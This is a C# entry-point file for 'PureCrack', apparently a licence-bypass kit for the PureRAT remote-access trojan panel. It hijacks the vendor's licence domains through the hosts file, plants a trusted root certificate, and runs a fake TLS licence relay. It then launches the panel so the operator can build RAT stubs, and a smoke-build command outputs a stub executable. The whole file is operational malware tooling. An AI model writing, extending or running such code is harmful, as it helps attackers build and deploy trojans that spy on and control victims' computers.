using System;
using System.IO;
using System.Text;
using System.Threading;
using PureCrack.Build;
using PureCrack.Panel;
using PureCrack.Relay;
using PureCrack.Setup;
using PureCrack.Util;

namespace PureCrack;

/// <summary>
/// Entry point.
///
/// Default invocation (no args) — full kit launch sequence:
///   1. Banner + embedded-asset sanity check.
///   2. Preflight (admin / :443 / hosts / panel exe / Roslyn — all in one pass).
///   3. Hosts file: add api*.purecoder.io entries, flush DNS.
///   4. Certs: ensure relay PFX (install in Root) + agent PFX.
///   5. Construct route handlers + start TlsRelay on :443 (background thread).
///   6. Settings.json auto-fix (reorder IPs, loopback first).
///   7. Launch the panel via ShellExecute.
///   8. Wait for the panel to bind :56001, print READY.
///   9. Block until Ctrl-C; stop relay; exit.
///
/// Subcommands:
///   <c>smoke-build</c> — exercise the StubBuilder pipeline only and write
///                        the result to runs/stubs/. Useful for CI tests.
///   <c>help</c>        — usage.
/// </summary>
internal static class Program
{
    public const int RelayPort = 443;
    public const int PanelPort = 56001;
    private static readonly TimeSpan PanelReadyTimeout = TimeSpan.FromMinutes(5);

    public static int Main(string[] args)
    {
        // Catch unhandled exceptions on background threads (relay accept loop,
        // ThreadPool work items) and route them through the same crash logger
        // so silent worker-thread crashes don't lose information.
        AppDomain.CurrentDomain.UnhandledException += (_, e) =>
        {
            WriteCrashLog("AppDomain.UnhandledException", e.ExceptionObject as Exception);
        };

        try
        {
            Console.OutputEncoding = Encoding.UTF8;
        }
        catch { /* console may not exist; non-fatal */ }

        try
        {
            Log.Banner("PureCrack v2.0  ─  PureRAT licence relay");
            Log.Kv("Workspace", Workspace.Root);
            Log.Kv("Captures", Workspace.CapturesDir);
            Log.Kv("Stubs",    Workspace.StubsDir);

            if (!CheckEmbeddedAssets()) return PauseAndExit(1);

            if (args.Length > 0)
            {
                switch (args[0])
                {
                    case "smoke-build": return SmokeBuildCommand();
                    case "cleanup":     return CleanupCommand();
                    case "doctor":      return DoctorCommand();
                    case "help":
                    case "--help":
                    case "-h":
                        PrintHelp();
                        return 0;
                }
            }

            return RunFullKit();
        }
        catch (Exception ex)
        {
            WriteCrashLog("Main", ex);
            return PauseAndExit(2);
        }
    }

    /// <summary>
    /// Persist the unhandled exception to <c>data/last-crash.log</c> AND
    /// echo it to the console. The file survives even if the operator
    /// double-clicked the EXE and the console window vanishes on exit.
    /// </summary>
    private static void WriteCrashLog(string source, Exception? ex)
    {
        var msg =
            $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] CRASH ({source})\n" +
            $"  Message: {ex?.Message ?? "<no exception object>"}\n" +
            $"  Type:    {ex?.GetType().FullName ?? "<unknown>"}\n" +
            $"  Stack:\n{Indent(ex?.ToString() ?? "<no stack>", "    ")}\n" +
            "----------------------------------------\n";

        try { Console.Error.WriteLine(msg); } catch { /* console gone */ }

        try
        {
            var path = Path.Combine(Workspace.DataDir, "last-crash.log");
            File.AppendAllText(path, msg);
            try { Console.Error.WriteLine($"crash log: {path}"); } catch { }
        }
        catch
        {
            // Last-resort fallback: drop next to the EXE. If even this fails,
            // there's nothing useful we can do.
            try
            {
                var exeDir = Path.GetDirectoryName(typeof(Program).Assembly.Location)
                             ?? Environment.CurrentDirectory;
                File.AppendAllText(Path.Combine(exeDir, "last-crash.log"), msg);
            }
            catch { /* genuine give-up */ }
        }
    }

    private static string Indent(string s, string prefix)
    {
        if (string.IsNullOrEmpty(s)) return s;
        return prefix + s.Replace("\n", "\n" + prefix);
    }

    /// <summary>
    /// On double-click launch, the console window closes when the process
    /// exits — the operator never sees the error message. Pause for a key
    /// when stdin is interactive so they can read what happened.
    /// </summary>
    private static int PauseAndExit(int code)
    {
        try
        {
            if (!Console.IsInputRedirected)
            {
                Console.Error.WriteLine();
                Console.Error.WriteLine("Press any key to close...");
                Console.ReadKey(intercept: true);
            }
        }
        catch { /* no console or no input — fine */ }
        return code;
    }

    // ============================================================================
    // Full kit orchestration
    // ============================================================================

    private static int RunFullKit()
    {
        Log.Section("preflight");
        var pf = Preflight.Run();
        Preflight.Report(pf);
        if (!pf.Ok) return 1;

        try
        {
            Log.Section("hosts + certs");
            HostsManager.Ensure();
            var relayCert = CertManager.EnsureRelayCert();
            var agentPfx  = CertManager.EnsureAgentCertPfxBytes();

            Log.Section("relay");
            var routes = new RouteHandlers(agentPfx, EmbeddedAssets.CannedCompileResponse);
            using var relay = new TlsRelay(relayCert, routes);
            relay.Start();

            Log.Section("settings + panel");
            var panelExe = pf.PanelExePath!;
            var settingsPath = SettingsAutoFix.FindSettingsJson(panelExe);
            if (settingsPath != null)
            {
                SettingsAutoFix.ReorderIpsToLoopbackFirst(settingsPath);

                // Repair CustomPlugins[].FilePath entries. The shipped
                // Settings.json had an absolute dev-machine path baked in;
                // when that path doesn't resolve on the operator's box,
                // PureHelper.dll (and with it the 37 client-feature DLLs:
                // Telegram notifier, screenshot/thumbnail capture, etc.)
                // never registers, and any UI button whose handler does
                // plugins.First(...) crashes the panel on click.
                SettingsAutoFix.FixPluginPaths(settingsPath, panelExe);
            }
            else
                Log.Warn($"Settings.json not found near {panelExe} — skipping IPs reorder + plugin fix " +
                         "(set PURE_SETTINGS_JSON if it lives elsewhere)");

            using var panelProc = PanelLauncher.Launch(panelExe);

            var done = new ManualResetEventSlim(false);
            Console.CancelKeyPress += (_, e) => { e.Cancel = true; done.Set(); };

            // The panel needs the operator to click Login before it binds :56001.
            // Wait up to 5 min; print READY when it comes up. Past that, leave
            // the relay running anyway — the operator might still click Login,
            // and the relay is happy to receive /validate /compile traffic
            // whenever they do.
            var ready = PanelLauncher.WaitForListener(PanelPort, PanelReadyTimeout);
            if (ready)
            {
                Log.Banner("READY  ─  panel + relay running");
                Log.Info("click 'Builder Settings → Build' in the panel to produce a stub");
                Log.Info("stubs land in runs/stubs/. captures in runs/captures/.");
                Log.Info("Ctrl-C to stop the relay (panel keeps running).");
            }
            else
            {
                Log.Warn($"panel didn't bind :{PanelPort} within {PanelReadyTimeout.TotalMinutes:0} min — " +
                         "did you click Login? relay is still listening, so it's not too late.");
            }

            done.Wait();

            Log.Section("shutdown");
            relay.Stop();
            Log.Info("relay stopped. panel left running. exiting.");
            return 0;
        }
        catch (Exception ex)
        {
            Log.Err($"fatal: {ex.Message}");
            Log.Bullet(ex.ToString());
            return 1;
        }
    }

    // ============================================================================
    // Embedded-asset sanity check
    // ============================================================================

    private static bool CheckEmbeddedAssets()
    {
        try
        {
            _ = EmbeddedAssets.InnerSources.Count;
            _ = EmbeddedAssets.LoaderTemplate.Length;
            _ = EmbeddedAssets.ProtobufNetDll.Length;
            _ = EmbeddedAssets.CannedCompileResponse.Length;
            Log.Ok($"embedded assets OK ({EmbeddedAssets.InnerSources.Count} inner sources, " +
                   $"{EmbeddedAssets.ProtobufNetDll.Length:N0}b protobuf-net.dll, " +
                   $"{EmbeddedAssets.CannedCompileResponse.Length:N0}b canned /compile)");
            return true;
        }
        catch (Exception ex)
        {
            Log.Err($"embedded assets missing — corrupted EXE? {ex.Message}");
            return false;
        }
    }

    // ============================================================================
    // smoke-build subcommand
    // ============================================================================

    private static int SmokeBuildCommand()
    {
        Log.Section("smoke-build: exercise the StubBuilder pipeline only");
        var cfg = new BuildConfig
        {
            Ips = new() { "127.0.0.1" },
            Ports = new() { 56001 },
            CertPfxBase64 = "",
            Group = "smoke-test",
            Mutex = "purecrack-smoke",
        };
        try
        {
            var exeBytes = StubBuilder.Build(cfg);
            var outPath = Path.Combine(Workspace.StubsDir,
                $"smoke_{DateTime.Now:yyyyMMdd_HHmmss}.exe");
            File.WriteAllBytes(outPath, exeBytes);
            Log.Ok($"smoke-build OK — wrote {exeBytes.Length:N0}b stub to {outPath}");
            return 0;
        }
        catch (Exception ex)
        {
            Log.Err($"smoke-build FAILED: {ex.Message}");
            Log.Bullet(ex.ToString());
            return 1;
        }
    }

    private static void PrintHelp()
    {
        Console.WriteLine();
        Console.WriteLine("Usage: PureCrack.exe [subcommand]");
        Console.WriteLine();
        Console.WriteLine("With no subcommand: starts the full kit (relay + panel launch).");
        Console.WriteLine();
        Console.WriteLine("Subcommands:");
        Console.WriteLine("  smoke-build    Exercise the stub builder pipeline only (CI test)");
        Console.WriteLine("  cleanup        Remove ALL PureCrack state from this machine:");
        Console.WriteLine("                 hosts entries, Root certs, data/*.pfx, sslcert/urlacl bindings.");
        Console.WriteLine("                 Run this BEFORE installing other tools that bind :443 or :8443.");
        Console.WriteLine("  doctor         Diagnose-only: report stale certs, hosts entries, and HTTP.SYS");
        Console.WriteLine("                 bindings without modifying anything.");
        Console.WriteLine("  help           Show this message");
        Console.WriteLine();
        Console.WriteLine("Environment overrides:");
        Console.WriteLine("  PURECRACK_WORKSPACE   Override workspace root (default: EXE dir)");
        Console.WriteLine("  PURE_PANEL_EXE        Path to PureRAT.exe");
        Console.WriteLine("  PURE_SETTINGS_JSON    Path to panel's Settings.json (default: sibling of PURE_PANEL_EXE)");
    }

    // ============================================================================
    // cleanup subcommand
    // ============================================================================

    private static int CleanupCommand()
    {
        Log.Section("cleanup: removing PureCrack state");
        var failures = 0;

        // 1) Hosts file — remove entries we added
        try { HostsManager.Remove(); }
        catch (Exception ex) { Log.Err($"hosts: {ex.Message}"); failures++; }

        // 2) Sweep Root store certs we installed (subject contains "PureCrack")
        try { SweepRootCerts(); }
        catch (Exception ex) { Log.Err($"root certs: {ex.Message}"); failures++; }

        // 3) HTTP.SYS bindings — clean :443 and :8443 (PureLogs's port) just in case
        foreach (var port in new[] { 443, 8443 })
        {
            try { CleanHttpSys(port); }
            catch (Exception ex) { Log.Err($"http.sys :{port}: {ex.Message}"); failures++; }
        }

        // 4) Local PFX files
        try { CertManager.Wipe(); }
        catch (Exception ex) { Log.Err($"data/: {ex.Message}"); failures++; }

        if (failures == 0) Log.Ok("cleanup complete — system restored");
        else Log.Warn($"cleanup completed with {failures} non-fatal errors (see above)");
        return failures == 0 ? 0 : 1;
    }

    /// <summary>
    /// The exact subject DNs we have ever generated for the relay cert. Listed
    /// here so cleanup / doctor target only certs we know we own — never a
    /// substring match on "PureCrack" that could clobber an unrelated user
    /// cert with that string in its O= or OU= field.
    /// </summary>
    private static readonly string[] OurCertSubjects =
    {
        "CN=api.purecoder.io, O=PureCrack, OU=Relay", // current (post-hardening leaf)
        "CN=api.purecoder.io",                         // legacy single-CN form
    };

    private static bool IsOurCert(System.Security.Cryptography.X509Certificates.X509Certificate2 c)
    {
        var subject = c.SubjectName.Name;
        if (subject == null) return false;
        foreach (var known in OurCertSubjects)
            if (string.Equals(subject, known, StringComparison.OrdinalIgnoreCase)) return true;
        return false;
    }

    private static void SweepRootCerts()
    {
        using var store = new System.Security.Cryptography.X509Certificates.X509Store(
            System.Security.Cryptography.X509Certificates.StoreName.Root,
            System.Security.Cryptography.X509Certificates.StoreLocation.LocalMachine);
        store.Open(System.Security.Cryptography.X509Certificates.OpenFlags.ReadWrite);

        var ours = new System.Collections.Generic.List<System.Security.Cryptography.X509Certificates.X509Certificate2>();
        foreach (var c in store.Certificates)
        {
            if (IsOurCert(c)) ours.Add(c);
        }
        foreach (var c in ours)
        {
            store.Remove(c);
            Log.Bullet($"removed cert: {c.SubjectName.Name} (thumbprint {c.Thumbprint.Substring(0, 12)}…)");
        }
        Log.Ok($"swept {ours.Count} cert(s) from LocalMachine\\Root");
    }

    private static void CleanHttpSys(int port)
    {
        // Best-effort. Nonexistent bindings produce a non-zero exit but are
        // harmless; we just want the slot empty.
        RunNetsh($"http delete sslcert ipport=0.0.0.0:{port}");
        RunNetsh($"http delete sslcert ipport=127.0.0.1:{port}");
        RunNetsh($"http delete urlacl url=https://+:{port}/");
        RunNetsh($"http delete urlacl url=http://+:{port}/");
        Log.Ok($"http.sys :{port} entries cleared");
    }

    private static void RunNetsh(string args)
    {
        try
        {
            using var p = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("netsh", args)
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            });
            p?.WaitForExit(5000);
        }
        catch { /* netsh missing or hung — non-fatal in cleanup context */ }
    }

    // ============================================================================
    // doctor subcommand — read-only diagnostic
    // ============================================================================

    private static int DoctorCommand()
    {
        Log.Section("doctor: diagnose installation state");

        // 1) Hosts entries
        try
        {
            var hostsContent = File.ReadAllText(HostsManager.Path);
            var found = 0;
            foreach (var d in HostsManager.Domains)
            {
                if (hostsContent.IndexOf(d, StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    Log.Bullet($"hosts: {d} present");
                    found++;
                }
            }
            if (found == 0) Log.Info("hosts: no PureCrack entries");
            else Log.Info($"hosts: {found}/{HostsManager.Domains.Length} entries present");
        }
        catch (Exception ex) { Log.Warn($"hosts read failed: {ex.Message}"); }

        // 2) Root certs
        try
        {
            using var store = new System.Security.Cryptography.X509Certificates.X509Store(
                System.Security.Cryptography.X509Certificates.StoreName.Root,
                System.Security.Cryptography.X509Certificates.StoreLocation.LocalMachine);
            store.Open(System.Security.Cryptography.X509Certificates.OpenFlags.ReadOnly);
            var ours = 0;
            foreach (var c in store.Certificates)
            {
                if (IsOurCert(c))
                {
                    Log.Bullet($"cert: {c.SubjectName.Name} thumb={c.Thumbprint.Substring(0, 12)}… exp={c.NotAfter:yyyy-MM-dd}");
                    ours++;
                }
            }
            Log.Info($"root certs: {ours} PureCrack-related");
        }
        catch (Exception ex) { Log.Warn($"root store read failed: {ex.Message}"); }

        // 3) data/ files
        foreach (var p in new[] { CertManager.RelayPfxPath, CertManager.AgentPfxPath })
        {
            if (File.Exists(p))
            {
                var fi = new FileInfo(p);
                Log.Bullet($"file: {Path.GetFileName(p)} ({fi.Length:N0}b, modified {fi.LastWriteTime:yyyy-MM-dd})");
            }
        }

        Log.Ok("doctor: scan complete");
        return 0;
    }
}
